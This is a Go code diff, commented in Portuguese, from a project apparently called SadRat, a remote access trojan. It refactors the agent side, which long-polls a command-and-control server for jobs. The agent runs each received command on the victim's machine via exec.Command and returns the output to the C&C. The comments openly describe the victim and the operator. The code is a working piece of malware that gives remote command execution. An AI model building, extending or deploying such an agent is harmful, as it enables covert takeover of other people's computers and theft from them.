@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"log"
 	"time"
+	"github.com/VitorDie/SadRat/internal/domain"
 	"github.com/VitorDie/SadRat/internal/dto"
 )
 
@@ -72,51 +73,52 @@ func (a *AgentHTTP) RequestAnUUIDToMe() (string, error) {
 }
 
 // RequestJob faz o Long Polling perguntando ao C&C: "Mestre, o que devo fazer?"
-func (a *AgentHTTP) RequestJob(agentID string) (dto.JobUsedByAgentDTO, error) {
-	// 1. Monta a URL exata do Operador
+func (a *AgentHTTP) RequestJob(agentID string) (domain.JobEntity, error) {
 	url := a.serverURL + "/api/agents/" + agentID + "/job"
 
-	// 2. Prepara a requisição GET (Long Polling usa GET)
 	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
-		return dto.JobUsedByAgentDTO{}, err
+		return domain.JobEntity{}, err
 	}
 
-	// 3. O Agente dispara a requisição e aguarda (pacientemente)
 	resp, err := a.httpClient.Do(req)
 	if err != nil {
-		return dto.JobUsedByAgentDTO{}, err
+		return domain.JobEntity{}, err
 	}
 	defer resp.Body.Close()
 
-	// 4. Se o servidor retornou 204 No Content (Sem Comandos), ou algum erro
 	if resp.StatusCode != http.StatusOK {
-		return dto.JobUsedByAgentDTO{}, errors.New("nenhum comando recebido ou falha no servidor")
+		return domain.JobEntity{}, errors.New("nenhum comando recebido ou falha no servidor")
 	}
 
-	// 5. O C&C devolveu 200 OK! Vamos ler qual comando devemos executar
-	var job dto.JobUsedByAgentDTO
-	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
-		return dto.JobUsedByAgentDTO{}, err
+	// 1. Lemos o DTO da rede
+	var jobDTO dto.JobUsedByAgentDTO
+	if err := json.NewDecoder(resp.Body).Decode(&jobDTO); err != nil {
+		return domain.JobEntity{}, err
 	}
 
-	return job, nil
+	// 2. MAPEAMENTO: Convertemos DTO para Entidade de Domínio
+	pureJob := domain.JobEntity{
+		ID:      jobDTO.ID,
+		Command: jobDTO.Command,
+		Args:    jobDTO.Args,
+	}
+
+	// 3. Retornamos a entidade limpa!
+	return pureJob, nil
 }
 
-// ExecuteJob invoca o Sistema Operacional da vítima para rodar o comando e capturar a saída
-func (a *AgentHTTP) ExecuteJob(job dto.JobUsedByAgentDTO) (string, error) {
-	// 1. Preparamos o comando para o Sistema Operacional usando os/exec
+// ExecuteJob invoca o SO para rodar o comando (agora recebe a Entidade Pura!)
+func (a *AgentHTTP) ExecuteJob(job domain.JobEntity) (string, error) {
+	// Como a entidade possui a mesma estrutura útil, a lógica do OS não muda
 	cmd := exec.Command(job.Command, job.Args...)
 
-	// 2. Executamos o comando e capturamos a saída padrão (stdout e stderr combinados)
 	output, err := cmd.CombinedOutput()
 	
 	if err != nil {
-		// Se o comando falhar (ex: comando não existe), devolvemos o erro junto com o que o terminal cuspiu
 		return string(output) + "\n" + err.Error(), err
 	}
 
-	// 3. Devolvemos a string limpa do terminal para ser enviada de volta ao C&C
 	return string(output), nil
 }
 
